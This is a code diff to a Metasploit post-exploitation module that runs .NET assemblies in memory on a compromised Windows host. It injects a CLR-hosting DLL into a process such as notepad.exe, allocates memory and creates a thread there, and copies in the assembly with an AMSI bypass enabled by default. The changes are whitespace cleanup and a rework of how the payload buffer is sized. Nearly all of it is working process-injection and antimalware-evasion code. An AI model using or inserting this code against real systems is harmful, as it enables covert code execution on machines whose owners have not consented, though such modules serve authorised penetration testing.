@@ -20,7 +20,7 @@ class MetasploitModule < Msf::Post
                       This module execute a .net assembly in memory.
                       Refletctively load the dll that host CLR, than
                       copy in memory the assembly that will be executed.
-					  Credits for Amsi bypass to Rastamouse (@_RastaMouse)
+                      Credits for Amsi bypass to Rastamouse (@_RastaMouse)
                       ',
                       'License' => MSF_LICENSE,
                       'Author' => 'b4rtik',
@@ -38,37 +38,30 @@ class MetasploitModule < Msf::Post
       [
         OptString.new('ASSEMBLY', [true, 'Assembly file name']),
         OptPath.new('ASSEMBLYPATH', [false, 'Assembly directory',
-                                     ::File.join(Msf::Config.data_directory, 
+                                     ::File.join(Msf::Config.data_directory,
                                                  'execute-assembly')]),
         OptString.new('ARGUMENTS', [false, 'Command line arguments']),
-		OptString.new('PROCESS', [false, 'Process to spawn','notepad.exe']),
+        OptString.new('PROCESS', [false, 'Process to spawn','notepad.exe']),
         OptInt.new('PID', [false, 'Pid  to inject', 0]),
-		OptBool.new('AMSIBYPASS', [true, 'Enable Amsi bypass', true]),
-		OptInt.new('WAIT', [false, 'Time in seconds to wait', 10])
+        OptBool.new('AMSIBYPASS', [true, 'Enable Amsi bypass', true]),
+        OptInt.new('WAIT', [false, 'Time in seconds to wait', 10])
       ], self.class
     )
   end
 
   def run
     exe_path = gen_exe_path
-    assembly_size = File.size(exe_path)
-    client.response_timeout=20
-    params_size = if datastore['ARGUMENTS'].nil?
-                    0
-                  else
-                    datastore['ARGUMENTS'].length
-                  end
-
-    if assembly_size <= 1_024_000 && params_size <= 1_024
+    if File.file?(exe_path)
+      assembly_size = File.size(exe_path)
+      client.response_timeout=20
+      params_size = if datastore['ARGUMENTS'].nil?
+                      0
+                    else
+                      datastore['ARGUMENTS'].length
+                    end
       execute_assembly(exe_path)
     else
-      if assembly_size > 1_024_000
-        print_bad("Assembly max size 1024k actual file size #{assembly_size}")
-      end
-      if params_size > 1023
-        print_bad('Parameters max lenght 1024 actual parameters length' \
-                  "#{params_size}")
-      end
+      print_bad("Assembly not found #{exe_path}")
     end
   end
 
@@ -88,7 +81,7 @@ class MetasploitModule < Msf::Post
     out_process_name = if process_name.split(//).last(4).join.eql? '.exe'
                          process_name
                        else
-                         process_name + '.exe' 
+                         process_name + '.exe'
                        end
     out_process_name
   end
@@ -114,7 +107,7 @@ class MetasploitModule < Msf::Post
 
     library_path = ::File.join(Msf::Config.data_directory,
                                'post', 'execute-assembly',
-							   'HostingCLRx64.dll')
+                               'HostingCLRx64.dll')
     library_path = ::File.expand_path(library_path)
 
     print_status("Injecting Host into #{process.pid}...")
@@ -145,7 +138,7 @@ class MetasploitModule < Msf::Post
     hprocess.thread.create(exploit_mem + offset, assembly_mem)
 
     sleep(datastore['WAIT'])
-    
+
     if datastore['PID'] <= 0
       read_output(process)
       print_good("Killing process #{hprocess.pid}")
@@ -157,23 +150,32 @@ class MetasploitModule < Msf::Post
 
   def copy_assembly(exe_path, process)
     print_status("Host injected. Copy assembly into #{process.pid}...")
-    assembly_mem = process.memory.allocate(1_025_024, PAGE_READWRITE)
-
-    params = if datastore['AMSIBYPASS'] == true
+    int_param_size = 8
+    amsi_flag_size = 1
+    exe_path = gen_exe_path
+    assembly_size = File.size(exe_path)
+    argssize = if datastore['ARGUMENTS'].nil?
+                 1
+               else
+                 datastore['ARGUMENTS'].size + 1
+               end
+    payload_size = assembly_size + argssize + amsi_flag_size + int_param_size
+    assembly_mem = process.memory.allocate(payload_size, PAGE_READWRITE)
+    params = [assembly_size].pack('I*')
+    params += [argssize].pack('I*')
+    params += if datastore['AMSIBYPASS'] == true
                "\x01"
              else
                "\x02"
              end
-
     params += if datastore['ARGUMENTS'].nil?
                ''
              else
                datastore['ARGUMENTS']
              end
-    params += ("\x00" * (1024 - params.length))
+    params += "\x00"
 
     process.memory.write(assembly_mem, params + File.read(exe_path))
-
     print_status('Assembly copied.')
     assembly_mem
   end
@@ -181,8 +183,8 @@ class MetasploitModule < Msf::Post
   def read_output(process)
     print_status('Start reading output')
     begin
-      loop do 
-        output = process.channel.read 
+      loop do
+        output = process.channel.read
         output.split("\n").each { |x| print_good(x) }
         break if output.length == 0
       end
